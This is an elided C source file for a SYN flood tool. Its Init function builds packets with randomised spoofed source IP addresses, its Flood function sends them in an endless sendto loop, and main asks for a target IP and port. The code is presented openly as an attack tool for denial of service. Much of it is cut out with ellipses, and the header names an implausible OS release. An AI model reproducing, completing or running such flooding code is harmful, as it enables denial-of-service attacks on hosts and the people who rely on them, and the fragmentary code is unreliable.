/********************************************************************************************
* SYN Flood, Test on Red Hat Enterprise Linux AS release 5 (Taroon Update 8), gcc 3.23
...
void Init(char *buffer)
{
	...
	sprintf(src_ip, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1,
		rand() % 250 + 1);
...
void Flood()
{
	...
	if (sleeptime == 0) {
		while (1) {
			...
			Init(buffer);
			sendto(sock, buffer, PACKET_SIZE, 0, (struct sockaddr *)(&sa),
...
int main(int argc, char *argv[])
{
	...
	if (argc != 5) {
		fprintf(stderr, "\n%s <target ip> <target port> <pkt_then_sleep> <sleep_time>\n",
			argv[0]);
		fprintf(stderr,
			"send syn packets to <target ip>:<target port>, sleep <sleep_time> microseconds per <pkt_then_sleep> paskets\n\n");
		return -1;
	}
